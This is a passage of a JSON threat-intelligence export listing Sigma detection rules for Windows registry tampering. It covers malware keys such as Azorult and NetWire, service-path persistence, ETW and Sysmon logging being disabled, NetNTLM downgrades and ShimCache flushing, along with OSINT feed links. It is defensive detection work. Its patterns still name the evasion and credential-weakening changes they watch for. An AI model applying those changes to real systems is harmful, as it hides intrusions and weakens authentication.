                            "raw": "author: Teymur Kheirkhabarov (idea), Ryan Plas (rule), oscd.community\ndate: 2020/10/05\ndescription: Search for usage of reg or Powershell by non-privileged users to modify\n  service configuration in registry\ndetection:\n  condition: (reg or powershell) and select_data\n  powershell:\n    CommandLine|contains:\n    - powershell\n    - set-itemproperty\n    - ' sp '\n    - new-itemproperty\n  reg:\n    CommandLine|contains|all:\n    - 'reg '\n    - add\n  select_data:\n    CommandLine|contains:\n    - ImagePath\n    - FailureCommand\n    - ServiceDLL\n    CommandLine|contains|all:\n    - ControlSet\n    - Services\n    IntegrityLevel: Medium\nfalsepositives:\n- Unknown\nfields:\n- EventID\n- IntegrityLevel\n- CommandLine\nid: 8f02c935-effe-45b3-8fc9-ef8696a9e41d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-20-638.jpg\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Non-privileged Usage of Reg or Powershell\n",
                            "sigma:id": "8f02c935-effe-45b3-8fc9-ef8696a9e41d",
                            "title": "Non-privileged Usage of Reg or Powershell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7",
                        "lookup_data": {
                            "description": "Detects the presence of a registry key created during Azorult execution",
                            "raw": "author: Trent Liffick\ndate: 2020/05/08\ndescription: Detects the presence of a registry key created during Azorult execution\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 12\n    - 13\n    TargetObject|contains: SYSTEM\\\n    TargetObject|endswith: \\services\\localNETService\nfalsepositives:\n- Unknown\nfields:\n- Image\n- TargetObject\n- TargetDetails\nid: f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.azoruit.a\nstatus: test\ntags:\n- attack.execution\n- attack.t1112\ntitle: Registry Entries For Azorult Malware\n",
                            "sigma:id": "f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7",
                            "title": "Registry Entries For Azorult Malware",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
                        "lookup_data": {
                            "description": "Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys",
                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2022/08/19\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new\n  keys or subkeys\ndetection:\n  condition: all of selection_*\n  selection_path:\n    CommandLine|contains:\n    - \\AppDataLow\\Software\\Microsoft\\\n    - \\Policies\\Microsoft\\Windows\\OOBE\n    - \\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    - \\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\n    - \\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n    - \\Microsoft\\Windows Defender\\\n  selection_reg:\n  - Image|endswith: \\reg.exe\n  - OriginalFileName: reg.exe\nfalsepositives:\n- Rare legitimate add to registry via cli (to these locations)\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/10\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.t1562.001\ntitle: Reg Add Suspicious Paths\n",
                            "sigma:id": "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
                            "title": "Reg Add Suspicious Paths",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fdbf0b9d-0182-4c43-893b-a1eaab92d085",
                        "lookup_data": {
                            "description": "Detects potential persistence activity via the registering of a new custom protocole handlers. While legitimate applications register protocole handlers often times during installation. And attacker can abuse this by setting a custom handler to be used as a persistence mechanism.",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/05/30\ndescription: Detects potential persistence activity via the registering of a new custom\n  protocole handlers. While legitimate applications register protocole handlers often\n  times during installation. And attacker can abuse this by setting a custom handler\n  to be used as a persistence mechanism.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_generic_locations:\n    Image|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\n    - C:\\Windows\\\n  filter_ms_trusted:\n    Details|startswith: URL:ms-\n  selection:\n    Details|startswith: 'URL:'\n    TargetObject|startswith: HKCR\\\nfalsepositives:\n- Legitimate applications registering a new custom protocol handler\nid: fdbf0b9d-0182-4c43-893b-a1eaab92d085\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://ladydebug.com/blog/2019/06/21/custom-protocol-handler-cph/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Potential Persistence Via Custom Protocol Handler\n",
                            "sigma:id": "fdbf0b9d-0182-4c43-893b-a1eaab92d085",
                            "title": "Potential Persistence Via Custom Protocol Handler",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e3fdf743-f05b-4051-990a-b66919be1743",
                        "lookup_data": {
                            "description": "Detect change of the user account associated with the FAX service to avoid the escalation problem.",
                            "raw": "author: frack113\ndate: 2022/07/17\ndescription: Detect change of the user account associated with the FAX service to\n  avoid the escalation problem.\ndetection:\n  condition: selection and not filter\n  filter:\n    Details|contains: NetworkService\n  selection:\n    TargetObject: HKLM\\System\\CurrentControlSet\\Services\\Fax\\ObjectName\nfalsepositives:\n- Unknown\nid: e3fdf743-f05b-4051-990a-b66919be1743\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://twitter.com/dottor_morte/status/1544652325570191361\n- https://raw.githubusercontent.com/RiccardoAncarani/talks/master/F-Secure/unorthodox-lateral-movement.pdf\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Change User Account Associated with the FAX Service\n",
                            "sigma:id": "e3fdf743-f05b-4051-990a-b66919be1743",
                            "title": "Change User Account Associated with the FAX Service",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5b175490-b652-4b02-b1de-5b5b4083c5f8",
                        "lookup_data": {
                            "description": "Detects actions caused by the RedMimicry Winnti playbook",
                            "raw": "author: Alexander Rausch\ndate: 2020/06/24\ndescription: Detects actions caused by the RedMimicry Winnti playbook\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains: HKLM\\SOFTWARE\\Microsoft\\HTMLHelp\\data\nfalsepositives:\n- Unknown\nid: 5b175490-b652-4b02-b1de-5b5b4083c5f8\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://redmimicry.com\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: RedMimicry Winnti Playbook Registry Manipulation\n",
                            "sigma:id": "5b175490-b652-4b02-b1de-5b5b4083c5f8",
                            "title": "RedMimicry Winnti Playbook Registry Manipulation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "198effb6-6c98-4d0c-9ea3-451fa143c45c",
                        "lookup_data": {
                            "description": "This rule detects the execution of Run Once task as configured in the registry",
                            "raw": "author: Avneet Singh @v3t0_, oscd.community, Christopher Peacock @SecurePeacock (updated)\ndate: 2020/10/18\ndescription: This rule detects the execution of Run Once task as configured in the\n  registry\ndetection:\n  condition: all of selection_*\n  selection_cli:\n  - CommandLine|contains: /AlternateShellStartup\n  - CommandLine|endswith: /r\n  selection_img:\n  - Image|endswith: \\runonce.exe\n  - Description: Run Once Wrapper\nfalsepositives:\n- Unknown\nid: 198effb6-6c98-4d0c-9ea3-451fa143c45c\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/13\nreferences:\n- https://twitter.com/pabraeken/status/990717080805789697\n- https://lolbas-project.github.io/lolbas/Binaries/Runonce/\n- https://twitter.com/0gtweet/status/1602644163824156672?s=20&t=kuxbUnZPltpvFPZdCrqPXA\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Run Once Task Execution as Configured in Registry\n",
                            "sigma:id": "198effb6-6c98-4d0c-9ea3-451fa143c45c",
                            "title": "Run Once Task Execution as Configured in Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "277dc340-0540-42e7-8efb-5ff460045e07",
                        "lookup_data": {
                            "description": "Detect the creation of a service with a service binary located in a uncommon directory",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/05/02\ndescription: Detect the creation of a service with a service binary located in a uncommon\n  directory\ndetection:\n  condition: 1 of selection_* and not filter\n  filter:\n  - Image|contains:\n    - \\AppData\\Roaming\\Zoom\n    - \\AppData\\Local\\Zoom\n  - Details|contains:\n    - \\AppData\\Roaming\\Zoom\n    - \\AppData\\Local\\Zoom\n  selection_1:\n    Details:\n    - DWORD (0x00000000)\n    - DWORD (0x00000001)\n    - DWORD (0x00000002)\n    EventType: SetValue\n    Image|contains:\n    - \\AppData\\Local\\\n    - \\AppData\\Roaming\\\n    TargetObject|endswith: \\Start\n    TargetObject|startswith: HKLM\\System\\CurrentControlSet\\Services\\\n  selection_2:\n    Details|contains:\n    - \\AppData\\Local\\\n    - \\AppData\\Roaming\\\n    EventType: SetValue\n    TargetObject|endswith: \\ImagePath\n    TargetObject|startswith: HKLM\\System\\CurrentControlSet\\Services\\\nfalsepositives:\n- Unknown\nid: 277dc340-0540-42e7-8efb-5ff460045e07\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/05/04\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Service Binary in Uncommon Folder\n",
                            "sigma:id": "277dc340-0540-42e7-8efb-5ff460045e07",
                            "title": "Service Binary in Uncommon Folder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "92b0b372-a939-44ed-a11b-5136cf680e27",
                        "lookup_data": {
                            "description": "Attempts to detect system changes made by Blue Mockingbird",
                            "raw": "author: Trent Liffick (@tliffick)\ndate: 2020/05/14\ndescription: Attempts to detect system changes made by Blue Mockingbird\ndetection:\n  condition: selection\n  selection:\n    EventType: Setvalue\n    TargetObject|endswith: \\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll\nfalsepositives:\n- Unknown\nid: 92b0b372-a939-44ed-a11b-5136cf680e27\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://redcanary.com/blog/blue-mockingbird-cryptominer/\nrelated:\n- id: c3198a27-23a0-4c2c-af19-e5328d49680e\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1112\n- attack.t1047\ntitle: Blue Mockingbird - Registry\n",
                            "sigma:id": "92b0b372-a939-44ed-a11b-5136cf680e27",
                            "title": "Blue Mockingbird - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
                        "lookup_data": {
                            "description": "Turla: A Galaxy of Opportunity",
                            "link": "http://www.botvrij.eu/data/feed-osint/54dd4ef7-f7b2-418e-a191-5def4fbb0033.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1673286950",
                            "uuid": "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1d218616-71b0-4c40-855b-9dbe75510f7f",
                        "lookup_data": {
                            "description": "Attempts to detect registry events for common NetWire key HKCU\\Software\\NetWire",
                            "raw": "Note: You likely will have to change the sysmon configuration file. Per SwiftOnSecurity\n  \"Because Sysmon runs as a service, it has no filtering ability for, or concept of,\n  HKCU or HKEY_CURRENT_USER. Use \"contains\" or \"end with\" to get around this limitation\"\n  Therefore I set <TargetObject condition=\"contains\">netwire</TargetObjecct> in my\n  configuration.\nauthor: Christopher Peacock\ndate: 2021/10/07\ndescription: Attempts to detect registry events for common NetWire key HKCU\\Software\\NetWire\ndetection:\n  condition: selection\n  selection:\n    EventType: CreateKey\n    TargetObject|contains: \\software\\NetWire\nfalsepositives:\n- Unknown\nid: 1d218616-71b0-4c40-855b-9dbe75510f7f\nlevel: high\nlogsource:\n  category: registry_add\n  product: windows\nmodified: 2022/06/26\nreferences:\n- https://www.fortinet.com/blog/threat-research/new-netwire-rat-variant-spread-by-phishing\n- https://resources.infosecinstitute.com/topic/netwire-malware-what-it-is-how-it-works-and-how-to-prevent-it-malware-spotlight/\n- https://unit42.paloaltonetworks.com/guloader-installing-netwire-rat/\n- https://blogs.blackberry.com/en/2021/09/threat-thursday-netwire-rat-is-coming-down-the-line\n- https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: NetWire RAT Registry Key\n",
                            "sigma:id": "1d218616-71b0-4c40-855b-9dbe75510f7f",
                            "title": "NetWire RAT Registry Key",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
                        "lookup_data": {
                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_reg1\n  selection_reg1:\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UMe\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UT\nfalsepositives:\n- Unknown\nid: 7bdf2a7c-3acc-4091-9581-0a77dad1c5b5\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - Registry\n",
                            "sigma:id": "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
                            "title": "Chafer Activity - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5d9b516c-e5f0-4e7c-a958-5d8c0a019371",
                        "lookup_data": {
                            "description": "Operation Ghost - White Paper",
                            "link": "http://www.botvrij.eu/data/feed-osint/5d9b516c-e5f0-4e7c-a958-5d8c0a019371.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1571855044",
                            "uuid": "5d9b516c-e5f0-4e7c-a958-5d8c0a019371",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                        "lookup_data": {
                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1666603345",
                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bf4fc428-dcc3-4bbd-99fe-2422aeee2544",
                        "lookup_data": {
                            "description": "Potential adversaries stopping ETW providers recording loaded .NET assemblies.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/06/05\ndescription: Potential adversaries stopping ETW providers recording loaded .NET assemblies.\ndetection:\n  condition: 1 of selection_*\n  selection_complus:\n    Details:\n    - 0\n    - DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith:\n    - \\COMPlus_ETWEnabled\n    - \\COMPlus_ETWFlags\n  selection_etw_enabled:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith: SOFTWARE\\Microsoft\\.NETFramework\\ETWEnabled\nfalsepositives:\n- Unknown\nid: bf4fc428-dcc3-4bbd-99fe-2422aeee2544\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://twitter.com/_xpn_/status/1268712093928378368\n- https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr\n- https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables\n- https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38\n- https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39\n- https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_\n- https://bunnyinside.com/?term=f71e8cb9c76a\n- http://managed670.rssing.com/chan-5590147/all_p1.html\n- https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code\n- https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/\n- https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf\nrelated:\n- id: a4c90ea1-2634-4ca0-adbb-35eae169b6fc\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.t1562\ntitle: ETW Logging Disabled In .NET Processes - Sysmon Registry\n",
                            "sigma:id": "bf4fc428-dcc3-4bbd-99fe-2422aeee2544",
                            "title": "ETW Logging Disabled In .NET Processes - Sysmon Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc",
                        "lookup_data": {
                            "description": "Potential threat actor tampering with Sysmon manifest and eventually disabling it",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/07/14\ndescription: Potential threat actor tampering with Sysmon manifest and eventually\n  disabling it\ndetection:\n  condition: 1 of selection*\n  selection1:\n    EventID: 4657\n    NewValue: 0\n    ObjectName|contains:\n    - WINEVT\\Publishers\\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\n    - WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\n    ObjectValueName: Enabled\n  selection2:\n    AccessMask: 65536\n    EventID: 4663\n    ObjectName|contains:\n    - WINEVT\\Publishers\\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\n    - WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\nfalsepositives:\n- Unknown\nid: 18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/05\nreferences:\n- https://twitter.com/Flangvik/status/1283054508084473861\n- https://twitter.com/SecurityJosh/status/1283027365770276866\n- https://securityjosh.github.io/2020/04/23/Mute-Sysmon.html\n- https://gist.github.com/Cyb3rWard0g/cf08c38c61f7e46e8404b38201ca01c8\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Sysmon Channel Reference Deletion\n",
                            "sigma:id": "18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc",
                            "title": "Sysmon Channel Reference Deletion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "37b437cf-3fc5-4c8e-9c94-1d7c9aff842b",
                        "lookup_data": {
                            "description": "Detect enable rdp feature to allow specific user to rdp connect on the targeted machine",
                            "raw": "author: frack113\ndate: 2022/08/19\ndescription: Detect enable rdp feature to allow specific user to rdp connect on the\n  targeted machine\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: System\\CurrentControlSet\\Control\\Terminal Server\\fAllowToGetHelp\nfalsepositives:\n- Legitmate use of the feature (alerts should be investigated either way)\nid: 37b437cf-3fc5-4c8e-9c94-1d7c9aff842b\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Allow RDP Remote Assistance Feature\n",
                            "sigma:id": "37b437cf-3fc5-4c8e-9c94-1d7c9aff842b",
                            "title": "Allow RDP Remote Assistance Feature",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "68fcba0d-73a5-475e-a915-e8b4c576827e",
                        "lookup_data": {
                            "description": "Remote registry management using REG utility from non-admin workstation",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Remote registry management using REG utility from non-admin workstation\ndetection:\n  condition: selection_1 and not selection_2\n  selection_1:\n    EventID: 5145\n    RelativeTargetName|contains: \\winreg\n  selection_2:\n    IpAddress: '%Admins_Workstations%'\nfalsepositives:\n- Legitimate usage of remote registry management by administrator\nid: 68fcba0d-73a5-475e-a915-e8b4c576827e\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2020/08/23\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.discovery\n- attack.t1012\n- attack.credential_access\n- attack.t1552.002\n- attack.s0075\ntitle: Remote Registry Management Using Reg Utility\n",
                            "sigma:id": "68fcba0d-73a5-475e-a915-e8b4c576827e",
                            "title": "Remote Registry Management Using Reg Utility",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b0524451-19af-4efa-a46f-562a977f792e",
                        "lookup_data": {
                            "description": "Detects actions that clear the local ShimCache and remove forensic evidence",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/02/01\ndescription: Detects actions that clear the local ShimCache and remove forensic evidence\ndetection:\n  condition: ( selection1a and selection1b ) or ( selection2a and selection2b )\n  selection1a:\n    CommandLine|contains|all:\n    - rundll32\n    - apphelp.dll\n  selection1b:\n    CommandLine|contains:\n    - ShimFlushCache\n    - '#250'\n  selection2a:\n    CommandLine|contains|all:\n    - rundll32\n    - kernel32.dll\n  selection2b:\n    CommandLine|contains:\n    - BaseFlushAppcompatCache\n    - '#46'\nfalsepositives:\n- Unknown\nfields:\n- Image\n- CommandLine\n- ParentCommandLine\nid: b0524451-19af-4efa-a46f-562a977f792e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://medium.com/@blueteamops/shimcache-flush-89daff28d15e\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: ShimCache Flush\n",
                            "sigma:id": "b0524451-19af-4efa-a46f-562a977f792e",
                            "title": "ShimCache Flush",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "21f17060-b282-4249-ade0-589ea3591558",
                        "lookup_data": {
                            "description": "Detects new registry key created by Ursnif malware.",
                            "raw": "author: megan201296\ndate: 2019/02/13\ndescription: Detects new registry key created by Ursnif malware.\ndetection:\n  condition: selection and not filter\n  filter:\n    TargetObject|contains:\n    - \\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\\n    - \\SOFTWARE\\AppDataLow\\Software\\Microsoft\\RepService\\\n    - \\SOFTWARE\\AppDataLow\\Software\\Microsoft\\IME\\\n    - \\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Edge\\\n  selection:\n    EventType: CreateKey\n    TargetObject|contains: \\Software\\AppDataLow\\Software\\Microsoft\\\nfalsepositives:\n- Unknown\nid: 21f17060-b282-4249-ade0-589ea3591558\nlevel: high\nlogsource:\n  category: registry_add\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://blog.yoroi.company/research/ursnif-long-live-the-steganography/\n- https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\nstatus: test\ntags:\n- attack.execution\n- attack.t1112\ntitle: Ursnif\n",
                            "sigma:id": "21f17060-b282-4249-ade0-589ea3591558",
                            "title": "Ursnif",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
                        "lookup_data": {
                            "description": "Detects NetNTLM downgrade attack",
                            "raw": "author: Florian Roth (Nextron Systems), wagga\ndate: 2018/03/20\ndescription: Detects NetNTLM downgrade attack\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains|all:\n    - SYSTEM\\\n    - ControlSet\n    - \\Control\\Lsa\n    TargetObject|endswith:\n    - \\lmcompatibilitylevel\n    - \\NtlmMinClientSec\n    - \\RestrictSendingNTLMTraffic\nfalsepositives:\n- Unknown\nid: d67572a0-e2ec-45d6-b8db-c100d14b8ef2\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1112\ntitle: NetNTLM Downgrade Attack - Registry\n",
                            "sigma:id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
                            "title": "NetNTLM Downgrade Attack - Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "275641a5-a492-45e2-a817-7c81e9d9d3e9",
                        "lookup_data": {
                            "description": "Detect set DisallowRun to 1 to prevent user running specific computer program",
                            "raw": "author: frack113\ndate: 2022/08/19\ndescription: Detect set DisallowRun to 1 to prevent user running specific computer\n  program\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\nfalsepositives:\n- Unknown\nid: 275641a5-a492-45e2-a817-7c81e9d9d3e9\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Add DisallowRun Execution to Registry\n",
                            "sigma:id": "275641a5-a492-45e2-a817-7c81e9d9d3e9",
                            "title": "Add DisallowRun Execution to Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7ec912f2-5175-4868-b811-ec13ad0f8567",
                        "lookup_data": {
                            "description": "Detects a new and suspicious printer port creation in Registry that could be an attempt to exploit CVE-2020-1048",
                            "raw": "author: EagleEye Team, Florian Roth (Nextron Systems), NVISO\ndate: 2020/05/13\ndescription: Detects a new and suspicious printer port creation in Registry that could\n  be an attempt to exploit CVE-2020-1048\ndetection:\n  condition: selection\n  selection:\n    Details|contains:\n    - .dll\n    - .exe\n    - .bat\n    - .com\n    - 'C:'\n    EventType: SetValue\n    TargetObject|startswith: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports\nfalsepositives:\n- New printer port install on host\nid: 7ec912f2-5175-4868-b811-ec13ad0f8567\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/01/13\nreferences:\n- https://windows-internals.com/printdemon-cve-2020-1048/\nstatus: test\ntags:\n- attack.persistence\n- attack.execution\n- attack.defense_evasion\n- attack.t1112\ntitle: Suspicious New Printer Ports in Registry (CVE-2020-1048)\n",
                            "sigma:id": "7ec912f2-5175-4868-b811-ec13ad0f8567",
                            "title": "Suspicious New Printer Ports in Registry (CVE-2020-1048)",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "73bba97f-a82d-42ce-b315-9182e76c57b1",
                        "lookup_data": {
                            "description": "Detects the import of the specified file to the registry with regedit.exe.",
